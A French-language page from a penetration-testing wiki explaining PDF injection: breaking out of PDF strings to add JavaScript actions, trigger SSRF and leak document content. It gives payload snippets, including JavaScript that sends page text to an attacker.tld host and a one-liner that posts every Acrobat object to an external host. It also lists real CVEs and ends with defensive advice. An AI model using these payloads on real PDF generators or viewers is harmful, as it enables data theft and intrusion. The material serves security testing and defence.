# Injection PDF

{{#include ../../banners/hacktricks-training.md}}

**Si votre entrée est reflétée à l'intérieur d'un fichier PDF, vous pouvez essayer d'injecter des données PDF pour exécuter JavaScript, effectuer un SSRF ou voler le contenu du PDF.**
La syntaxe PDF est extrêmement permissive – si vous pouvez sortir de la chaîne ou du dictionnaire qui intègre votre entrée, vous pouvez ajouter de nouveaux objets (ou de nouvelles clés dans le même objet) que Acrobat/Chrome analysera avec plaisir.
Depuis 2024, une vague de rapports de bug-bounty a montré qu'*une parenthèse ou un antislash non échappé suffit* pour une exécution complète de script.

## TL;DR – Flux d'attaque moderne (2024)
1. Trouvez toute valeur contrôlée par l'utilisateur qui se retrouve à l'intérieur d'une **(chaîne de parenthèses)**, `/URI ( … )` ou `/JS ( … )` dans le PDF généré.
2. Injectez `) ` (fermant la chaîne) suivi de l'une des primitives ci-dessous et terminez par une autre parenthèse ouvrante pour garder la syntaxe valide.
3. Livrez le PDF malveillant à une victime (ou à un service backend qui rend automatiquement le fichier – idéal pour les bugs aveugles).
4. Votre charge utile s'exécute dans le visualiseur PDF :
* Chrome / Edge → PDFium Sandbox
* Firefox → PDF.js (voir CVE-2024-4367)
* Acrobat → API JavaScript complète (peut exfiltrer le contenu de fichiers arbitraires avec `this.getPageNthWord`)

Exemple (détournement de lien d'annotation) :
```pdf
(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
```
*Le premier `)` ferme la chaîne URI d'origine, nous ajoutons ensuite un nouveau dictionnaire **Action** qu'Acrobat exécutera lorsque l'utilisateur cliquera sur le lien.*

## Primitives d'injection utiles
| Objectif | Extrait de charge utile | Remarques |
|----------|------------------------|-----------|
| **JavaScript à l'ouverture** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | S'exécute instantanément lorsque le document est ouvert (fonctionne dans Acrobat, pas dans Chrome). |
| **JavaScript sur le lien** | `/A << /S /JavaScript /JS (fetch('https://attacker.tld/?c='+this.getPageNumWords(0))) >>` | Fonctionne dans PDFium & Acrobat si vous contrôlez une annotation `/Link`. |
| **Exfiltration de données aveugle** | `<< /Type /Action /S /URI /URI (https://attacker.tld/?leak=)` | Combinez avec `this.getPageNthWord` à l'intérieur de JS pour voler du contenu. |
| **SSRF côté serveur** | Même que ci-dessus mais cible une URL interne – idéal lorsque le PDF est rendu par des services de back-office qui respectent `/URI`. |
| **Saut de ligne pour de nouveaux objets** | `\nendobj\n10 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj` | Si la bibliothèque vous permet d'injecter des caractères de nouvelle ligne, vous pouvez créer des objets totalement nouveaux. |

## Astuce d'énumération aveugle
Gareth Heyes (PortSwigger) a publié une ligne de code qui énumère chaque objet à l'intérieur d'un document inconnu – pratique lorsque vous ne pouvez pas voir le PDF généré :
```pdf
) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
```
Le code itère sur le DOM d'Acrobat et effectue des requêtes sortantes pour chaque paire propriété/valeur, vous donnant un *dump JSON-ish* du fichier.  
Voir le livre blanc “Portable Data **ex**Filtration” pour la technique complète.

## Bugs du monde réel (2023-2025)
* **CVE-2024-4367** – L'exécution arbitraire de JavaScript dans PDF.js de Firefox avant 4.2.67 a contourné le bac à sable avec une action `/JavaScript` conçue.
* **Bug bounty 2024-05** – Un grand fintech a permis des notes de facture fournies par les clients qui se sont retrouvées dans `/URI` ; le rapport a été payé 10 000 $ après avoir démontré un SSRF vers un hôte de métadonnées interne en utilisant l'URI `file:///`.
* **CVE-2023-26155** – L'injection de commande `node-qpdf` via un chemin PDF non assaini montre l'importance d'échapper les barres obliques inverses et les parenthèses même *avant* la couche PDF.

## Feuille de triche défensive
1. **Ne jamais concaténer les entrées utilisateur brutes** à l'intérieur des chaînes ou noms `(`…`)`. Échapper `\`, `(`, `)` comme requis par §7.3 de la spécification PDF ou utiliser des chaînes hexadécimales `<...>`.
2. Si vous construisez des liens, préférez `/URI (https://…)` que vous *encodez* complètement en URL ; bloquez les schémas `javascript:` dans les visionneuses client.
3. Supprimez ou validez les dictionnaires `/OpenAction`, `/AA` (actions supplémentaires), `/Launch`, `/SubmitForm` et `/ImportData` lors du post-traitement des PDF.
4. Du côté serveur, rendez les PDF non fiables avec un *convertisseur sans tête* (par exemple, qpdf –decrypt –linearize) qui supprime JavaScript et les actions externes.
5. Gardez les visionneuses PDF à jour ; PDF.js < 4.2.67 et Acrobat Reader avant juillet 2024 permettent une exécution de code triviale.

## Références
* Gareth Heyes, “Portable Data exFiltration – XSS for PDFs”, PortSwigger Research (mis à jour en mai 2024). <https://portswigger.net/research/portable-data-exfiltration>
* Dawid Ryłko, “CVE-2024-4367: Arbitrary JavaScript Execution in PDF.js” (avr 2024). <https://dawid.dev/sec/cve-2024-4367-arbitrary-javascript-execution-in-pdf-js>
{{#include ../../banners/hacktricks-training.md}}
